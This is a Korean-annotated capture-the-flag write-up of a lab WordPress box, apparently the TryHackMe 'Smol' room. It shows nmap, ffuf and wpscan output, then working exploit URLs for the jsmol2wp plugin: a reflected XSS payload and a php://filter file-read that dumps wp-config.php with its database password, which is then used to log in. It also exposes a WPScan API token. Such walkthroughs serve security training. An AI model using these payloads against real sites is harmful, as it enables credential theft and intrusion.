# IP: 10.10.198.23

# nmap -> 22, 80

http://www.smol.thm

Nmap scan report for 10.10.198.23
Host is up (0.29s latency).
Not shown: 995 closed tcp ports (reset), 3 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 3072 86:fb:3f:1f:18:c9:c9:32:cb:10:08:20:d0:f7:c3:58 (RSA)
| 256 ae:c8:74:d8:57:c1:26:67:92:b1:21:ef:9a:e0:c7:ea (ECDSA)
|\_ 256 59:77:71:a7:d8:b9:92:cc:00:e4:e3:b0:f9:16:03:f8 (ED25519)
80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
|\_http-title: Did not follow redirect to http://www.smol.thm
|\_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.78 seconds

# 단서

# Suggested text: Our website address is: http://192.168.204.139.

# http://www.smol.thm/wp-login.php?redirect_to=http%3A%2F%2Fwww.smol.thm%2Findex.php%2F2023%2F08%2F16%2Frce%2F

# ffuf -> 워드프레스 구조 확인

ffuf -u http://www.smol.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt

┌──(root㉿docker-desktop)-[/]
└─# ffuf -u http://www.smol.thm/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -o ffuf.txt -t 50

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

---

:: Method : GET
:: URL : http://www.smol.thm/FUZZ
:: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
:: Output file : ffuf.txt
:: File format : json
:: Follow redirects : false
:: Calibration : false
:: Timeout : 10
:: Threads : 50
:: Matcher : Response status: 200-299,301,302,307,401,403,405,500

---

:: Progress: [50/207643] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:16] :: Errors: 0 ::
[ERR] NOPE
wp-content [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 4579ms]
wp-includes [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 510ms]
wp-admin [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 272ms]

# 결과 확인

```bash
sudo apt install jq
cat ffuf.txt | jq
```

# wpscan -> directory listing, CSRF, SSRF are found

wpscan --url http://www.smol.thm --api-token UkGyliOCsyQuHgPPpEip3b6wkbP5rAV2XaeWBYTogao

┌──(root㉿docker-desktop)-[/]
└─# wpscan --url http://www.smol.thm --api-token UkGyliOCsyQuHgPPpEip3b6wkbP5rAV2XaeWBYTogao

---

         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart

---

[+] URL: http://www.smol.thm/ [10.10.198.23]
[+] Started: Thu Jul 24 15:03:12 2025

Interesting Finding(s):

[+] Headers
| Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
| Found By: Headers (Passive Detection)
| Confidence: 100%

[+] XML-RPC seems to be enabled: http://www.smol.thm/xmlrpc.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%
| References:
| - http://codex.wordpress.org/XML-RPC_Pingback_API
| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
| - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
| - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://www.smol.thm/readme.html
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%

[+] Upload directory has listing enabled: http://www.smol.thm/wp-content/uploads/
| Found By: Direct Access (Aggressive Detection)
| Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.smol.thm/wp-cron.php
| Found By: Direct Access (Aggressive Detection)
| Confidence: 60%
| References:
| - https://www.iplocation.net/defend-wordpress-from-ddos
| - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Outdated, released on 2024-11-21).
| Found By: Rss Generator (Passive Detection)
| - http://www.smol.thm/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
| - http://www.smol.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>

[+] WordPress theme in use: twentytwentythree
| Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
| Last Updated: 2024-11-13T00:00:00.000Z
| Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
| [!] The version is out of date, the latest version is 1.6
| [!] Directory listing is enabled
| Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
| Style Name: Twenty Twenty-Three
| Style URI: https://wordpress.org/themes/twentytwentythree
| Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
| Author: the WordPress team
| Author URI: https://wordpress.org
|
| Found By: Urls In Homepage (Passive Detection)
|
| Version: 1.2 (80% confidence)
| Found By: Style (Passive Detection)
| - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] jsmol2wp
| Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
| Latest Version: 1.07 (up to date)
| Last Updated: 2018-03-09T10:28:00.000Z
|
| Found By: Urls In Homepage (Passive Detection)
|
| [!] 2 vulnerabilities identified:
|

# 취약점

| [!] Title: JSmol2WP <= 1.07 - Unauthenticated Cross-Site Scripting (XSS)
| References:
| - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20462
| - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
|
| [!] Title: JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
| References:
| - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
| - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
| - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
|
| Version: 1.07 (100% confidence)
| Found By: Readme - Stable Tag (Aggressive Detection)
| - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
| Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
| - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
Checking Config Backups - Time: 00:00:11 <=============================================================================================================================> (137 / 137) 100.00% Time: 00:00:11

[i] No Config Backups Found.

[+] WPScan DB API OK
| Plan: free
| Requests Done (during the scan): 3
| Requests Remaining: 22

[+] Finished: Thu Jul 24 15:03:41 2025
[+] Requests Done: 176
[+] Cached Requests: 5
[+] Data Sent: 43.933 KB
[+] Data Received: 254.962 KB
[+] Memory used: 265.801 MB
[+] Elapsed time: 00:00:28

# 취약점 그대로 악용하기 -> 사이트 웹 브라우저에 접속

# IP: 10.10.198.23, www.smol.thm -> CVE 취약점 확인

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert(/xss/)%3C/script%3E&mimetype=text/html;%20charset=utf-8

![](https://velog.velcdn.com/images/agnusdei1207/post/9489e7ee-b9c5-4def-b337-13f30ef6321f/image.png)

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php

![](https://velog.velcdn.com/images/agnusdei1207/post/b10129e7-2e41-42c0-b15d-76ed89c0c5f3/image.png)

```

<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

```

# 탈취한 정보로 로그인

![](https://velog.velcdn.com/images/agnusdei1207/post/1d998ee7-0c88-412b-b447-5103a27aa833/image.png)

# stored XSS 바로 확인 가능

![](https://velog.velcdn.com/images/agnusdei1207/post/477f28cf-9889-4aef-8be6-8cedd95d97b1/image.png)
